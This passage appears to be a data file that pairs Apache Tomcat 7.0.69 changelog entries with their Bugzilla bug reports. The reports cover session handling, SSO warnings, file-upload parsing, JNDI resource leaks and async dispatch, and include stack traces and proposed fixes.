WARNING: Failed to process JAR [jar:file:/G:/TEST!Maven!/.metadata/.plugins/org.eclipse.wst.server.core/tmp0/wtpwebapps/test/WEB-INF/lib/asm-3.3.1.jar!/] for TLD files
java.io.FileNotFoundException: G:\TEST!Maven (The system cannot find the file specified)
	at java.util.zip.ZipFile.open(Native Method)
	at java.util.zip.ZipFile.<init>(ZipFile.java:219)
	at java.util.zip.ZipFile.<init>(ZipFile.java:149)
	at java.util.jar.JarFile.<init>(JarFile.java:166)
	at java.util.jar.JarFile.<init>(JarFile.java:103)
	at sun.net.www.protocol.jar.URLJarFile.<init>(URLJarFile.java:93)
	at sun.net.www.protocol.jar.URLJarFile.getJarFile(URLJarFile.java:69)
	at sun.net.www.protocol.jar.JarFileFactory.get(JarFileFactory.java:109)
	at sun.net.www.protocol.jar.JarURLConnection.connect(JarURLConnection.java:122)
	at sun.net.www.protocol.jar.JarURLConnection.getJarFile(JarURLConnection.java:89)
	at org.apache.tomcat.util.scan.FileUrlJar.<init>(FileUrlJar.java:41)
	at org.apache.tomcat.util.scan.JarFactory.newInstance(JarFactory.java:34)
	at org.apache.catalina.startup.TldConfig.tldScanJar(TldConfig.java:489)
	at org.apache.catalina.startup.TldConfig.access$100(TldConfig.java:59)
	at org.apache.catalina.startup.TldConfig$TldJarScannerCallback.scan(TldConfig.java:305)
	at org.apache.tomcat.util.scan.StandardJarScanner.process(StandardJarScanner.java:259)
	 at org.apache.tomcat.util.scan.StandardJarScanner.scan(StandardJarScanner.java:178)
	at org.apache.catalina.startup.TldConfig.execute(TldConfig.java:278)
	at org.apache.catalina.startup.TldConfig.lifecycleEvent(TldConfig.java:569)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5322)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1559)
	at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1549)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at java.lang.Thread.run(Thread.java:745)

Feb 12, 2016 11:45:27 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Error getConfigured
Feb 12, 2016 11:45:27 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Context [/test] startup failed due to previous errors"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59001
Catalina|Tomcat 7.0.69 (violetagg)|fix|59043|Avoid warning while expiring sessions associated with a single sign on if HttpServletRequest.logout() is used. (markt)|SingleSignOn valve warns about missing session when invoking HttpServletRequest.logout|"When HttpServletRequest.logout() is invoked, first the ID of the current session is changed, then all the sessions in SingleSignOnEntry are expired, but the current one has changed its ID, hence the annoying warning.

From the log:
...
FINE [http-nio-8080-exec-3] AuthenticatorBase.register Authenticated 'john.doe' with type 'FORM'
FINE [http-nio-8080-exec-3] AuthenticatorBase.register Session ID changed on authentication from [6F6874832A811D2B69AA06F3745C4CC7] to [FD2777025AC71CA72A44545472DAB5C2]
FINE [http-nio-8080-exec-3] SingleSignOn.register SSO registering SSO session [9284A1891047D0FA96629C9059528302] for user [john.doe] with authentication type [FORM]
FINE [http-nio-8080-exec-3] SingleSignOn.associate SSO associating application session [StandardSession[FD2777025AC71CA72A44545472DAB5C2]] with SSO session [9284A1891047D0FA96629C9059528302]
...
FINE [http-nio-8080-exec-4] AuthenticatorBase.register Authenticated 'none' with type 'null'
FINE [http-nio-8080-exec-4] AuthenticatorBase.register Session ID changed on authentication from [FD2777025AC71CA72A44545472DAB5C2] to [DCE8372B4BF6AD84F63BF5664D8E941E]
FINE [http-nio-8080-exec-4] SingleSignOn.deregister SSO expiring application session [Host: [localhost], Context: [/app], SessionID: [FD2777025AC71CA72A44545472DAB5C2]] associated with SSO session [9284A1891047D0FA96629C9059528302]
WARNING [http-nio-8080-exec-4] SingleSignOn.expire SSO unable to expire session [Host: [localhost], Context: [/app], SessionID: [FD2777025AC71CA72A44545472DAB5C2]] because the Session could not be found
..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59043
Catalina|Tomcat 7.0.69 (violetagg)|fix|59054|Ensure that using the CrawlerSessionManagerValve in a distributed environment does not trigger an error when the Valve registers itself in the session. (markt)|CrawlerSessionManagerValve is not serializable, and throws exception when passing itself as sessionAttribute|"During first request to the application when user agent matches crawler pattern the execution reaches the point where it tries to store itself in sessionAttribute (s1.setAttribute(this.getClass().getName(), this)). Since CrawlerSessionManagerValve does not implement Serializable it throws exception:

java.lang.IllegalArgumentException: setAttribute: Non-serializable attribute org.apache.catalina.valves.CrawlerSessionManagerValve
	at org.apache.catalina.session.StandardSession.setAttribute(StandardSession.java:1465)
	at org.apache.catalina.session.StandardSession.setAttribute(StandardSession.java:1426)
	at org.apache.catalina.session.StandardSessionFacade.setAttribute(StandardSessionFacade.java:154)
	at org.apache.catalina.valves.CrawlerSessionManagerValve.invoke(CrawlerSessionManagerValve.java:190)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:423)
	at org.apache.coyote.ajp.AjpProcessor.process(AjpProcessor.java:190)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:625)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)



I was able to fix this bug by modyfing source code to implement Serializable interface."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59054
Catalina|Tomcat 7.0.69 (violetagg)|add||Log a warning message if a user tries to configure the default session timeout via the deprecated (and ignored) Manager.setMaxInactiveInterval() method. (markt)|||
Catalina|Tomcat 7.0.69 (violetagg)|fix||Correct a regression introduced in 7.0.68 where the deprecated Manager.getMaxInactiveInterval() method returned the current default session timeout in minutes rather than seconds. (markt)|||
Catalina|Tomcat 7.0.69 (violetagg)|fix||When a Host is configured with an appBase that does not exist, create the appBase before trying to expand an external WAR file into it. (markt)|||
Catalina|Tomcat 7.0.69 (violetagg)|fix|59115|When using the Servlet 3.0 file upload, the submitted file name may be provided as a token or a quoted-string. If a quoted-string, unquote the string before returning it to the user. (markt)|Part#getSubmittedFileName doesn't work corretly with double quotes in filenames.|"If using the File-Upload with Servlet 3.1 and selecting a file with name e.g. foo""bar"".jpg the method call part.getHeader(""Content-Disposition"") results to e.g. form-data; name=""file""; filename=""foo-\""bar\"".jpg"".

The call of part.getSubmittedFileName() results to foo-\""bar\"".jpg but should foo-""bar"".jpg because the quotes are not part of the name.

The parsing problem may also affect other functions..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59115
Catalina|Tomcat 7.0.69 (violetagg)|fix|59123|Close NamingEnumeration objects used by the JNDIRealm once they are no longer required. (fschumacher/markt)|The JNDIRealm does not close the NamingEnumeration|"The JNDIRealm does not close any of the NamingEnumeration it uses in the following methods :

- getUserBySearch, line 1685
- getRoles, line 1974
- addAttributeValues, line 2125

(this is from trunk, I saw the same issue in Tomcat 8, I suspect the problem is the same for all the tomcat versions)

The problem is that if a NamingEnumeration is not close, then the associated DirContext won't be closed, even if a DirContext.close() is explicitly called, leving the DirContext opened until it times out. The consequence is that if this DirContext is taken from a Pool of connection, you pretty quickly exhaust this pool, as the connction will be back into the available connections only when they timeout (an dthe default timeout is 30s, from the top of my head).

This is explicitely said on https://docs.oracle.com/javase/tutorial/jndi/ldap/close.html :

""You invoke Context.close() on a Context instance to indicate that you no longer need to use it. If the Context instance being closed is using a dedicated connection, the connection is also closed. If the Context instance is sharing a connection with other Context and unterminated NamingEnumeration instances, the connection will not be closed until close() has been invoked on all such Context and NamingEnumeration instances.""

or in https://blogs.oracle.com/moazam/entry/jndi_connections_not_closing_remember"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59123
Catalina|Tomcat 7.0.69 (violetagg)|fix|59138|Correct a false positive warning for ThreadLocal related memory leaks when the key class but not the value class has been loaded by the web application class loader. (markt)|checkThreadLocalMapForLeaks has false positives|"ThreadLocal$ThreadLocalMap weakly references keys but strongly references values.  However, it appears the checkThreadLocalMapForLeaks checking reports false positives if the key is a ThreadLocal subclass (e.g., anonymous class) but the value does not strongly reference the class loader (e.g., Integer, int[], List<SimpleDateFormatter>, etc.).  Example output:

07-Mar-2016 11:27:08.258 SEVERE [localhost-startStop-2] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [servlettest-0.1] created a ThreadLocal with key of type [servlettest.TestServlet$1] (value [servlettest.TestServlet$1@40d92399]) and a value of type [java.lang.Integer] (value [1]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.

For large web applications with many such false positives, this output makes tracking down (or even noticing new) real issues more difficult.  Third party libraries refuse to adjust their use of ThreadLocal because they believe (IMO rightly) their code is not causing leaks.  I have read bug 50175 comment 6, but given that the current heuristic has false positives, can some compromise be reached?  Perhaps some configuration for stifling the warning on a per key class name basis could be added?  It would even be acceptable for us if that configuration hid the per-instance message but issued a single overall ""suppressing N ThreadLocal warnings based on config"" info/warning message."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59138
Catalina|Tomcat 7.0.69 (violetagg)|fix|59145|Don't log an invalid warning when a user logs out of a session associated with SSO. (markt)|Incorrect warning logging on invalidate session when using SingleSignOn valve|"Created attachment 33650 [details]
Zip file containing java and xml sources

I have created a simple Servlet which is configured to use the SingleSignOn valve in combination with BASIC authentication.

When the servlet invalidates the session it results in a warning:

Mar 08, 2016 12:20:06 PM org.apache.catalina.authenticator.SingleSignOn expire
WARNING: SSO unable to expire session [Host: [localhost], Context: [/webproject], SessionID: [B2F3A538F5971CA3FC1EEE38CC2FFE95]] because the Session could not be found

The problem can also be reproduced on Tomcat 8.0.32"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59145
Catalina|Tomcat 7.0.69 (violetagg)|fix|59151|Fix a regression in the fix for 56917 that added additional (and arguably unnecessary) validation to the provided redirect location. (markt)|IllegalArgumentException in org.apache.catalina.connector.Response.sendRedirect() when URI has blank spaces|"The patch for Bug 56917 - https://bz.apache.org/bugzilla/show_bug.cgi?id=56917 has introduced a bug since release 8.0.30.

If relative redirects are supported and enabled and the URI has blank spaces, the method URI.create throws an ""java.lang.IllegalArgumentException"" with the following message: ""Illegal character in query at index 82: http://‚Ä¶""

java.lang.IllegalArgumentException: Illegal character in query at index 82: http://localhost:8080/GestionVentas/canalWeb?APPID=capturaventas&INTID=Declaracion de ventas por correo electronico&USERID=sisgenerico&EMPRESAID=CESCE&IDIOMID=ESP
	at java.net.URI.create(URI.java:852)
	at org.apache.catalina.connector.Response.sendRedirect(Response.java:1280)
	at org.apache.catalina.connector.Response.sendRedirect(Response.java:1252)
	at org.apache.catalina.connector.ResponseFacade.sendRedirect(ResponseFacade.java:500)
	at javax.servlet.http.HttpServletResponseWrapper.sendRedirect(HttpServletResponseWrapper.java:138)
	at org.springframework.security.web.context.SaveContextOnUpdateOrErrorResponseWrapper.sendRedirect(SaveContextOnUpdateOrErrorResponseWrapper.java:74)
	at org.springframework.web.servlet.view.RedirectView.sendRedirect(RedirectView.java:394)
	at org.springframework.web.servlet.view.RedirectView.renderMergedOutputModel(RedirectView.java:228)
	at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:250)
	at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1047)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:817)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:719)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:644)
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:549)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:622)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:729)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:292)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:207)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:240)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:207)
	at org.springframework.orm.jpa.support.OpenEntityManagerInViewFilter.doFilterInternal(OpenEntityManagerInViewFilter.java:113)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:240)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:207)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:368)
	at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:109)
	at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:83)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at com.indra.jee.arq.cam.core.seguridad.Log4jMDCUserFilter.doFilter(Log4jMDCUserFilter.java:82)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:97)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:100)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:78)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:54)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:35)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at com.cesce.serviciosva.seguridad.CheckChangePasswordFilter.doFilter(CheckChangePasswordFilter.java:76)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:187)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:187)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at org.jasig.cas.client.session.SingleSignOutFilter.doFilter(SingleSignOutFilter.java:110)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at com.cesce.serviciosva.seguridad.DBRoleFilter.doFilter(DBRoleFilter.java:97)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:79)
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:380)
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:169)
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:237)
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:167)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:240)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:207)
	at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:77)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:240)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:207)
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:240)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:207)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:212)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:106)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:502)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:141)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:79)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:616)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:88)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:522)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1095)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:672)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1500)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1456)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.net.URISyntaxException: Illegal character in query at index 82: http://localhost:8080/GestionVentas/canalWeb?APPID=capturaventas&INTID=Declaracion de ventas por correo electronico&USERID=sisgenerico&EMPRESAID=CESCE&IDIOMID=ESP
	at java.net.URI$Parser.fail(URI.java:2848)
	at java.net.URI$Parser.checkChars(URI.java:3021)
	at java.net.URI$Parser.parseHierarchical(URI.java:3111)
	at java.net.URI$Parser.parse(URI.java:3053)
	at java.net.URI.<init>(URI.java:588)
	at java.net.URI.create(URI.java:850)
	... 85 more

It is affecting release 8.0.30 and higher. (The previous exception was obtained with 8.0.32).

Proposed solution is replacing line 1294 (this line is from tag 8.0.30) in ""class org.apache.catalina.connector.Response.java"":

     locationUri = URI.create(location).toASCIIString();

with:

     String encodedLocation = URLEncoder.encode(location, ""UTF-8"");
     locationUri = URI.create(encodedLocation).toASCIIString();

and also importing:

      import java.net.URLEncoder;"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59151
Catalina|Tomcat 7.0.69 (violetagg)|fix|59206|Ensure NPE will not be thrown by o.a.tomcat.util.file.ConfigFileLoader when catalina.base is not specified. (violetagg)|When catalina.base is not specified, ConfigFileLoader throws an NPE in a static initializer|"Using Tomcat 7 as an embedded servlet and updating to Tomcat 7.0.68, we found our application no longer started due to an ExceptionInInitializerError.

This problem was introduced by the change for https://bz.apache.org/bugzilla/show_bug.cgi?id=56777, which includes https://github.com/apache/tomcat70/blob/trunk/java/org/apache/tomcat/util/file/ConfigFileLoader.java. This file, on line 37, loads the system property ""catalina.base"" and, when it is not set, throws a NullPointerException.

It seems like it would be preferable if, when catalina.base is not specified, to avoid this NPE."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59206
Catalina|Tomcat 7.0.69 (violetagg)|fix|59213|Async dispatches should be based off a wrapped request. (remm)|Async dispatch not working after cross-context forward|"I ran into this problem while working on the Apache Pluto project, which makes use of async features. I boiled it down to come up with two test servlets that are available here:

https://github.com/msnicklous/AsyncDebug

I have reproduced the problem on both Tomcat 8.0.28 and 8.0.32.

Problem description:

Given Servlet1 and Servlet2 running in separate servlet contexts.

Servlet1 contains the following code:

   PrintWriter writer = resp.getWriter(); 
   writer.append(""<h3>Async Debug1</h3>""); 
   AsyncContext actx = req.startAsync(req, resp);
   actx.dispatch(""/WEB-INF/jsp/debug1.jsp"");

When Servlet1 is accessed directly, the header ""Async Debug 1"" along with the
contents of debug1.jsp is displayed properly.

Servlet2 contains the following code:

   ServletContext ctx1 = req.getServletContext().getContext(""/AsyncDebug1"");
   RequestDispatcher rd = ctx1.getRequestDispatcher(""/Debug"");
   rd.forward(req, resp);

Servlet2 performs a cross-context forward to Servlet1. The Servlet2 web module
contains a context.xml file that enables cross-context support.

When Servlet2 is accessed, the header ""Async Debug 1"" is displayed, but the
contents of debug1.jsp is not displayed. Also, the log contains the following
message:

22-Mar-2016 08:47:58.875 SEVERE [http-apr-8080-exec-2]
org.apache.jasper.servlet.JspServlet.handleMissingResource File
[/WEB-INF/jsp/debug1.jsp] not found

I think this is incorrect behavior. Since Servlet1 initializes the AsyncContext,
this behavior would seen to contradict the Servlet Specification 3.1, page 15
where the description for the AsyncContext#dispatch(String path) method states:
""The given path is interpreted as relative to the ServletContext that
initialized the AsyncContext."". 

Additional info: 

by hacking around, I noticed that changing the Servlet1 dispatch call as follows causes the async dispatch to work even when Servlet1 is
accessed through a cross-context forward:

   actx.dispatch(req.getServletContext(), ""/WEB-INF/jsp/debug1.jsp"");
   
where 'req' is the HttpServletRequest. 

Thanks for having a look at this!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59213
Catalina|Tomcat 7.0.69 (violetagg)|fix|59217|Remove duplication in the recycling of the path in o.a.tomcat.util.http.ServerCookie. Patch is provided by Kyohei Nakamura. (violetagg)|Duplication of the recycling of the path in the ServerCookie|"Created attachment 33695 [details]
patch

The recycling of the path is invoked twice in the ServerCookie.recycle() method.
This is a duplicate code."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59217
Catalina|Tomcat 7.0.69 (violetagg)|fix||Ensure that javax.servlet.ServletRequest and javax.servlet.ServletResponse provided during javax.servlet.AsyncListener registration are made available via javax.servlet.AsyncEvent.getSuppliedRequest and javax.servlet.AsyncEvent.getSuppliedResponse (violetagg)|||
Catalina|Tomcat 7.0.69 (violetagg)|fix||Clarify the log message that specifying both urlPatterns and value attributes in WebServlet and WebFilter annotations is not allowed. (violetagg)|||
Catalina|Tomcat 7.0.69 (violetagg)|fix||Ensure the exceptions caused by Valves will be available in the log files so that they can be evaluated when o.a.catalina.valves.ErrorReportValve.showReport is disabled. Patch is provided by Svetlin Zarev. (violetagg)|||
Catalina|Tomcat 7.0.69 (violetagg)|fix|59247|Preload ResourceEntry as a workaround for security manager issues on some JVMs. (kkolinko/remm)|Using the IBM JDK with the security manager results in java.lang.RuntimePermission warning|"Created attachment 33707 [details]
policy patch proposal

When using the IBM JDK and the security manager the following warnings are logged:

WARNING [localhost-startStop-1] org.apache.juli.ClassLoaderLogManager.readConfiguration Reading logging.properties is not permitted in some context. See ""per context logging"" in the default catalina.policy file.
WARNING [localhost-startStop-1] org.apache.juli.ClassLoaderLogManager.readConfiguration Original error was: Access denied (""java.lang.RuntimePermission"" ""accessClassInPackage.org.apache.catalina.loader"")

I do not observe any negative effects of this warning, however I am only doing minimal testing and would like someone to review it to validate whether or not it is an issue. I assume that something not being able to load the logging.properties means that it isn't logging either.

It looks like adding the permission to the catalina.policy resolves the warning. I am attaching the patch which seems to work for me along with a few other files for review. Note that this does not seem to occur on trunk (though it does throw some warnings also), but it does on tomcat8 and previous versions. Also note that the added permission in the patch proposal does not exist in trunk, so I'm not sure if it is the way to go or not."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59247
Catalina|Tomcat 7.0.69 (violetagg)|fix|59269|Correct the implementation of PersistentManagerBase so that minIdleSwap functions as designed and sessions are swapped out to keep the active session count below maxActiveSessions. (markt)|Session swapping out in PersistentManagerBase|"I've been trying to setup PersistentManager, more precisely I wanted to configure session swapping out to achieve memory friendly configuration under high load.
To my surprise, this is not possible, or I must be missing something crucial.

Swapping out only works, when the session is idle for too long. However, it does not work together with the 'maxActiveSessions' configuration option.

Method processMaxActiveSwaps()
------------------------------
In the org.apache.catalina.session.PersistentManagerBase, there is method called processMaxActiveSwaps(), which should do the 'maxActiveSessions' checking and swap out superfluous sessions. However, the method body never executes:

Compare the condition ""if (getMaxActiveSessions() >= sessions.length) return;"" with the fact, that exception is thrown if too many sessions are created in org.apache.catalina.session.ManagerBase.createSession().


I've found this bug in versions 7, 8, 9. Seems that this bug is there since ages, the same already reported here (in 2001!!!):
https://mail-archives.apache.org/mod_mbox/tomcat-dev/200112.mbox/%3C3C20D8AE.D9B7795F@distributopia.com%3E
https://mail-archives.apache.org/mod_mbox/tomcat-dev/200112.mbox/<3C20D8AE.D9B7795F@distributopia.com>


Expected behaviour
------------------
Just to eliminate possible misunderstandings, here is what behaviour I expected from the documentation, the source code and what common sence tells me: there is configuration option 'maxActiveSessions' which simply limits number of sessions stored in the memory, to avoid OutOfMemExeption etc. However, I have session timeout set up for couple of hours (needed) and it is not possible to keep them all in memory. And I don't even want to tell to my users: Sorry, no space for you, here you have it: TooManyActiveSessionsException on you. So I'd like to swap out sessions not active for say half an hour. There is 'minIdleSwap' config option, which tells when the session may be swapped out if needed. BTW. as this does not work, this option is currently completely useless.

What can be done: remove the check in org.apache.catalina.session.ManagerBase.createSession() (or make it less strict - e.g. allow couple of additional sessions to be created over this limit). Then the processMaxActiveSwaps() method would do its job nicely and overflowing sessions would be swapped out.


Many thanks for 1) any clarification if I'm wrong OR 2) bug fixing :-) OR 3) removing the stale/old/never-more-working source code and documenting that this feature is simply not there even though it looks like it is."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59269
Coyote|Tomcat 7.0.69 (violetagg)|fix|58646|Correct a problem with sendfile that resulted in a Processor being added to the cache twice leading to broken responses. (markt)|NullPointerException in InternalNioOutputBuffer|"We're using Tomcat in our product. Under traffic we can reproduce the following exceptions:

Nov 23, 2015 CST 08:34:58.115 PM org.apache.coyote.http11.Http11NioProcessor
INFO: Error parsing HTTP request header
 Note: further occurrences of HTTP header parsing errors will be logged at DEBUG level.

Nov 23, 2015 CST 08:34:58.118 PM org.apache.coyote.http11.Http11NioProcessor
SEVERE: Error finishing response

java.lang.NullPointerException
	at org.apache.coyote.http11.InternalNioOutputBuffer.flushBuffer(InternalNioOutputBuffer.java:234)
	at org.apache.coyote.http11.InternalNioOutputBuffer.addToBB(InternalNioOutputBuffer.java:189)
	at org.apache.coyote.http11.InternalNioOutputBuffer.commit(InternalNioOutputBuffer.java:177)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:741)
	at org.apache.coyote.Response.action(Response.java:177)
	at org.apache.coyote.http11.AbstractOutputBuffer.endRequest(AbstractOutputBuffer.java:369)
	at org.apache.coyote.http11.AbstractHttp11Processor.endRequest(AbstractHttp11Processor.java:1804)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1143)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:673)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1500)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1456)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)


We have several applications deployed on our Tomcat. Most of the applications are simple Jersey Rest service applications. Above NullPointer is related to one of them (basically, the one which is called during traffic - I bet other apps will have the same issue if they would be called). Also we have one application which is using WebSockets (Tomcat implementation) and Async support for Comet. WebSocket interface is used during traffic testing while Comet is NOT (Servlets are not called). We have the following in our Tomcat main web.xml file (comparing to the default one):


    <filter>
        <filter-name>CorsFilter</filter-name>
        <filter-class>com.avaya.acc.base.web.filters.CorsFilter</filter-class>
        <async-supported>true</async-supported>
    </filter>
    <filter-mapping>
        <filter-name>CorsFilter</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>

    <filter>
        <filter-name>NoCachingFilter</filter-name>
        <filter-class>com.avaya.acc.base.web.filters.NoCachingFilter</filter-class>
        <async-supported>true</async-supported>
        <init-param>
          <param-name>Set-Expires</param-name>
          <param-value>false</param-value>
        </init-param>
        <init-param>
